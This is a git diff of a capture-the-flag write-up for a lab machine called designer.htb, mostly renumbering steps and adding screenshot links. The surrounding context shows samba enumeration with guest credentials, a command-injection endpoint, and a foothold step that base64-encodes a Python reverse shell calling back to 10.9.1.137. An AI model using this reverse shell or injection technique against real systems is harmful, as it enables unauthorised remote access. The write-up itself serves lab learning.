@@ -97,10 +97,13 @@ for any errors resulted for using the exploits, refer to the Writeup section to 
 
         Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                       
         Nmap done: 1 IP address (1 host up) scanned in 50.06 seconds
-3. enumerate the website. found emails ending with @designer.htb. (info@designer.htb, contact@designer.htb, etc) edit /etc/hosts to set designer.htb as the domain name
+2. index.html:
 <img src="img/index.png">
-5. button "contact us" redirects us to contact.html. reveal creds "guest:guest" for samba share to those interested in job application
-6. Checking Samba Share "candidates" with creds "guest:guest"
+3. enumerate the website. found emails ending with @designer.htb. (info@designer.htb, contact@designer.htb, etc) edit /etc/hosts to set designer.htb as the domain name
+<img src="img/email.png">
+4. button "contact us" redirects us to contact.html. reveal creds "guest:guest" for samba share to those interested in job application
+<img src="img/contact.png">
+5. Checking Samba Share "candidates" with creds "guest:guest"
 
         $ smbclient -L designer.htb -U guest
         Enter WORKGROUP\guest's password: guest                                                               
@@ -223,8 +226,10 @@ running a bash reverse shell to obtain a shell as the user "nobody" in a docker 
         underdevelopment
 
 8. add domain name underdevelopment.designer.htb into /etc/hosts
-9. discover manually html coded buttons in underdevelopment.designer.htb/services.html
-10. pressing the buttons redirects to:
+<img src="img/subindex.png">
+10. discover manually html coded buttons in underdevelopment.designer.htb/services.html
+<img src="img/subservices.png">
+11. pressing the buttons redirects to:
 
 http://underdevelopment.designer.htb/development.php?display={some base64 hash}
 
@@ -248,7 +253,7 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
         echo "<pre>$output</pre>";
         ?>
 
-11. Foothold
+12. Foothold
 
         $ echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.9.1.137',666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);\"" | base64 -w 0
         cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjkuMS4xMzcnLDY2NikpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWycvYmluL2Jhc2gnLCctaSddKTsiCg==
@@ -267,7 +272,7 @@ http://underdevelopment.designer.htb/development.php?display={some base64 hash}
         cat ~/user.txt
         c32ba831818880876035e98d868b9b70
         
-12. Privilege Escalation
+13. Privilege Escalation
 
         cybercraze@designer:/var/www/subdomains/underdevelopment$ sudo --version
         sudo --version
